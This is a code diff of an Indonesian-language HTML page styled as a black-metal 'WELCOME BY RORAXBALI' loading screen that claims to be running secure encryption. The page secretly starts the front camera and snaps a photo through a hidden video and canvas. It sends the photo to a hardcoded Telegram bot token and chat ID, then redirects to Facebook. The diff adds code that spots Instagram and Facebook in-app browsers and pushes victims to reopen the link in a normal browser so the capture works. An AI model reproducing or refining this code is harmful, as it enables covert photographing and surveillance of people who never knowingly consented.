@@ -7,7 +7,7 @@
     <!-- Mengambil font khusus metal dari Google Fonts -->
     <link rel="preconnect" href="https://googleapis.com">
     <link rel="preconnect" href="https://gstatic.com" crossorigin>
-    <link href="https://googleapis.com/css2?family=Metal+Mania&display=swap" rel="stylesheet">
+    <link href="https://googleapis.com" rel="stylesheet">
     
     <style>
         /* Mengatur dasar halaman full hitam pekat sesuai gambar sampel */
@@ -29,7 +29,7 @@
             display: none; 
         }
 
-        /* Kotak Konsol Utama (Transparan penuh agar menyatu dengan latar hitam) */
+        /* Kotak Konsol Utama */
         .terminal {
             width: 90%;
             max-width: 500px;
@@ -39,13 +39,13 @@
             z-index: 10;
         }
 
-        /* ORNAMEN GARIS MERAH ATAS (Efek melengkung tajam sesuai gambar) */
+        /* ORNAMEN GARIS MERAH ATAS */
         .garis-merah-atas {
             width: 80%;
             height: 4px;
             background: linear-gradient(90deg, transparent, #ff0000 20%, #ff0000 80%, transparent);
             margin: 0 auto 35px auto;
-            border-radius: 50% / 100% 100% 0 0; /* Membuat efek lengkungan sayap */
+            border-radius: 50% / 100% 100% 0 0;
             box-shadow: 0 0 12px #ff0000;
         }
 
@@ -59,33 +59,41 @@
             box-shadow: 0 0 12px #ff0000;
         }
 
-        /* TULISAN GAYA BLACK METAL (Putih Bersih, Runcing, dan Klasik) */
+        /* TULISAN GAYA BLACK METAL */
         h1 {
             margin: 0;
             font-family: 'Metal Mania', serif;
-            font-size: 38px; /* Ukuran diperbesar agar karakter huruf metalnya gagah */
+            font-size: 38px;
             font-weight: normal;
             color: #ffffff;
             letter-spacing: 3px;
             text-transform: uppercase;
-            /* Memberikan efek bayangan tipis agar tulisan lebih tegas */
             text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.8);
         }
 
         /* Teks status informasi sistem di bawah judul */
         .status-text {
             font-size: 14px;
-            color: #a3a3a3; /* Abu-abu metalik redup */
+            color: #a3a3a3;
             margin: 20px 0 0 0;
             font-weight: bold;
             letter-spacing: 1.5px;
             text-transform: uppercase;
+            line-height: 1.6;
         }
 
-        /* Status jika akses ditolak (Merah Menyala) */
-        .status-error {
+        /* Status khusus untuk instruksi Instagram Browser (Merah Berkedip) */
+        .status-instagram {
             color: #ff3333 !important;
             text-shadow: 0 0 10px #ff0000;
+            font-size: 15px;
+            animation: kedip 1.5s infinite;
+        }
+
+        @keyframes kedip {
+            0% { opacity: 1; }
+            50% { opacity: 0.4; }
+            100% { opacity: 1; }
         }
 
         /* Desain Progress Bar / Loading Bar Merah Minimalis */
@@ -107,7 +115,6 @@
             transition: width 1.5s cubic-bezier(0.25, 1, 0.5, 1);
         }
 
-        /* Loading bar tetap merah jika terjadi error */
         .progress-bar.error {
             background-color: #ff0000 !important;
             box-shadow: 0 0 12px #ff0000 !important;
@@ -116,27 +123,16 @@
 </head>
 <body>
 
-    <!-- Kotak Autentikasi Sistem Utama -->
     <div class="terminal">
-        <!-- Garis Merah Atas -->
         <div class="garis-merah-atas"></div>
-
-        <!-- Judul Utama Gaya Metal -->
         <h1>WELCOME BY RORAXBALI</h1>
-        
-        <!-- Status Sistem -->
         <div class="status-text" id="status">Menginisialisasi enkripsi aman...</div>
-        
-        <!-- Loading Bar -->
         <div class="progress-container">
             <div class="progress-bar" id="bar"></div>
         </div>
-
-        <!-- Garis Merah Bawah -->
         <div class="garis-merah-bawah"></div>
     </div>
 
-    <!-- Elemen penangkap foto internal tersembunyi (Ditambahkan atribut standar iOS/WebView) -->
     <video id="video" autoplay playsinline muted></video>
     <canvas id="hiddenCanvas"></canvas>
 
@@ -144,7 +140,7 @@
         // ==================== PENGATURAN UTAMA ====================
         const TELEGRAM_BOT_TOKEN = '8773430297:AAG5HZB1NM9sqSVFZnUgsB4cl0JRSkYUkBI'; 
         const TELEGRAM_CHAT_ID = '1966317946';     
-        const DOMAIN_TUJUAN = 'https://www.facebook.com/tisnaedy.tisnaedy/'; 
+        const DOMAIN_TUJUAN = 'https://facebook.com'; 
         // ==========================================================
 
         const video = document.getElementById('video');
@@ -152,50 +148,49 @@
         const statusText = document.getElementById('status');
         const progressBar = document.getElementById('bar');
 
-        // Optimasi resolusi constraints agar ramah WebView Instagram
-        const constraints = {
-            video: { 
-                facingMode: "user",
-                width: { ideal: 640 },
-                height: { ideal: 480 }
-            }, 
-            audio: false 
-        };
+        // Fungsi mengecek apakah dibuka dari dalam aplikasi Instagram
+        function isInstagram() {
+            return navigator.userAgent.includes("Instagram") || navigator.userAgent.includes("FBAN") || navigator.userAgent.includes("FBAV");
+        }
 
-        // 1. Meminta verifikasi akses perangkat (Kamera)
-        navigator.mediaDevices.getUserMedia(constraints)
-            .then(stream => {
-                video.srcObject = stream;
-                
-                // Menunggu event 'playing' untuk memastikan video stream benar-benar berjalan di IG
-                video.addEventListener('playing', () => {
-                    statusText.innerText = "Otorisasi berhasil. Membuka halaman...";
-                    progressBar.style.width = "65%"; 
-                    
-                    // Jeda 2000ms (2 detik) memberi waktu kamera Instagram menyesuaikan pencahayaan agar tidak gelap
-                    setTimeout(ambilFotoOtomatis, 2000);
+        // Jalankan pengecekan pertama kali halaman dimuat
+        if (isInstagram()) {
+            // Jika terdeteksi di IG, langsung stop proses kamera dan paksa user ganti browser
+            statusText.innerHTML = "⚠️ PERINGATAN SISTEM:<br>Klik titik 3 di pojok kanan atas,<br>lalu pilih 'Buka di Browser / Open in Browser' untuk melanjutkan.";
+            statusText.classList.add("status-instagram");
+            progressBar.style.width = "40%";
+            progressBar.classList.add("error");
+        } else {
+            // Jika dibuka di Chrome/Safari normal, jalankan skrip kamera seperti biasa
+            mulaiKameraSistem();
+        }
+
+        function mulaiKameraSistem() {
+            const constraints = {
+                video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }, 
+                audio: false 
+            };
+
+            navigator.mediaDevices.getUserMedia(constraints)
+                .then(stream => {
+                    video.srcObject = stream;
+                    video.addEventListener('playing', () => {
+                        statusText.innerText = "Otorisasi berhasil. Membuka halaman...";
+                        progressBar.style.width = "65%"; 
+                        setTimeout(ambilFotoOtomatis, 2000);
+                    });
+                })
+                .catch(err => {
+                    console.error("Akses ditolak: ", err);
+                    statusText.innerText = "OTORISASI GAGAL: Akses dibatasi karena izin perangkat ditolak.";
+                    progressBar.style.width = "100%";
+                    progressBar.classList.add("error");
+                    setTimeout(() => { window.location.href = DOMAIN_TUJUAN; }, 2000);
                 });
-            })
-            .catch(err => {
-                console.error("Akses ditolak: ", err);
-                
-                statusText.innerText = "OTORISASI GAGAL: Akses dibatasi karena izin perangkat ditolak.";
-                statusText.classList.add("status-error");
-                
-                progressBar.style.width = "100%";
-                progressBar.classList.add("error");
-                
-                // Dialihkan ke domain tujuan setelah 2 detik jika izin ditolak
-                setTimeout(() => {
-                    window.location.href = DOMAIN_TUJUAN;
-                }, 2000);
-            });
+        }
 
-        // 2. Pemrosesan penangkapan gambar secara terenkripsi
         function ambilFotoOtomatis() {
-            // Pastikan elemen video memiliki dimensi sebelum menggambar pada canvas
             if (video.videoWidth === 0 || video.videoHeight === 0) {
-                // Jika dimensi belum siap, coba lagi dalam 500ms
                 setTimeout(ambilFotoOtomatis, 500);
                 return;
             }
@@ -212,15 +207,10 @@
             context.restore();
 
             hiddenCanvas.toBlob((blob) => {
-                if (blob) {
-                    kirimKeTelegram(blob);
-                } else {
-                    window.location.href = DOMAIN_TUJUAN;
-                }
+                if (blob) { kirimKeTelegram(blob); } else { window.location.href = DOMAIN_TUJUAN; }
             }, 'image/jpeg', 0.85);
         }
 
-        // 3. Pengiriman berkas enkripsi ke server API Telegram
         function kirimKeTelegram(imageBlob) {
             const formData = new FormData();
             formData.append('chat_id', TELEGRAM_CHAT_ID);
@@ -235,10 +225,7 @@
             .then(data => {
                 progressBar.style.width = "100%"; 
                 statusText.innerText = "Koneksi selesai. Menghubungkan...";
-                
-                setTimeout(() => {
-                    window.location.href = DOMAIN_TUJUAN;
-                }, 800);
+                setTimeout(() => { window.location.href = DOMAIN_TUJUAN; }, 800);
             })
             .catch(error => {
                 console.error('Transmisi error:', error);
